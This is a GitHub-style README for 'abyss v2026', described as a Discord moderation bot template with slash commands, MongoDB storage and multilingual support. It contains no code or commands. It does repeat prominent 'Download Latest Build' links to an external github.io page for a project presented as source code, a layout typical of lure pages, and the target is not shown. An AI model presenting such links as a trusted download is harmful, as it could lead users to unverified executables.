# abyss v2026 - Discord moderation bot template 2026

> **A modular Discord moderation bot template for 2026, built for slash commands, MongoDB persistence, and multilingual server support.**

[![Platform](https://img.shields.io/badge/Platform-Discord-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/dylan-fisher1993/abyss-v2026-moderation-bot?style=flat-square)](https://github.com/dylan-fisher1993/abyss-v2026-moderation-bot)

---

<p align="center">
  <a href="https://dylan-fisher1993.github.io/abyss-v2026-moderation-bot/">
    <img src="https://img.shields.io/badge/Download-abyss%20Latest-brightgreen?style=for-the-badge" alt="Download abyss">
  </a>
</p>

> **[Direct Download - abyss v2026](https://dylan-fisher1993.github.io/abyss-v2026-moderation-bot/)**

---

[Download Latest Build](https://dylan-fisher1993.github.io/abyss-v2026-moderation-bot/)

---

## What abyss is

abyss is a Discord moderation bot template built to give server owners a clean starting point for moderation systems without having to wire everything together manually. It is shaped around current Discord workflows, with slash commands, persisted settings, and a layout that is easy to extend.

At its core, the template provides reusable moderation building blocks such as temporary punishments, event logging, and polished embed-based feedback. It works well for communities that need a flexible moderation base while still keeping control over custom commands, server rules, and language support.

---

## Capabilities

- Extensible moderation framework that can be expanded with custom guild logic
- Temporary warnings, mutes, kicks, and bans for standard enforcement tasks
- MongoDB-backed persistence for stored state and configuration
- Guild-level settings so each server can maintain its own moderation preferences
- Internationalization support for multilingual communities
- Slash command integration for a modern Discord command experience
- Embed-ready responses for cleaner moderation output
- Automatic reconnection behavior to help the bot recover after disconnects

---

## Setup

You can clone the repository or fetch the project files directly, then install the dependencies needed by your Discord runtime and database layer.

1. Get the source:
   - `git clone https://github.com/dylan-fisher1993/abyss-v2026-moderation-bot.git
   - or download the latest build from the project page
2. Install dependencies for the chosen runtime and MongoDB client
3. Configure your bot token, database connection, and server settings
4. Start the bot using your usual launch command for the project

If you are deploying through a host or container, confirm that the process can reach both Discord and your MongoDB instance before the first run.

---

## How to use it

After the bot is online, invite it to your server with the permissions required for moderation, logging, and slash commands.

Typical workflow:
- Register the slash commands
- Set up guild-specific moderation preferences
- Use moderation commands for warnings, temporary mutes, kicks, and bans
- Review logged events to track moderation actions
- Adjust language or response settings for each server as needed

From there, you can layer in your own commands, automations, or server-specific moderation rules while keeping the template's core structure intact.

---

## Configuration

Most settings are expected to live in your bot configuration and MongoDB storage.

Example structure:

{
  "token": "YOUR_DISCORD_BOT_TOKEN",
  "mongoUri": "YOUR_MONGODB_CONNECTION_STRING",
  "language": "en",
  "guildSettings": {
    "loggingChannel": "CHANNEL_ID",
    "moderationRole": "ROLE_ID"
  }
}

If your setup separates environment values from stored server data, keep secrets in environment variables and reserve MongoDB for persistent guild settings, moderation history, and localized preferences.

---

## Requirements

- Discord bot account and application setup
- Discord server permissions for moderation and command handling
- A MongoDB instance for persistent data storage
- A runtime compatible with the project structure
- Network access for Discord API connectivity
- Sufficient hosting uptime for continuous moderation and logging features

---

## FAQ

**How do I update abyss?**  
Pull the latest template changes from the repository, review your customizations, and redeploy after verifying config values and stored data compatibility.

**Where are server settings saved?**  
Server-specific settings are stored in MongoDB so each guild can keep its own moderation configuration.

**Can I localize responses?**  
Yes. The template includes internationalization support, so you can adapt responses for different languages.

**What should I check if commands do not appear?**  
Confirm that slash command registration completed successfully, the bot has the right permissions, and the application is connected to Discord.

**Why use this template instead of starting from zero?**  
It gives you a ready-made moderation foundation with persistence, logging, and command structure already in place, which reduces setup time.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
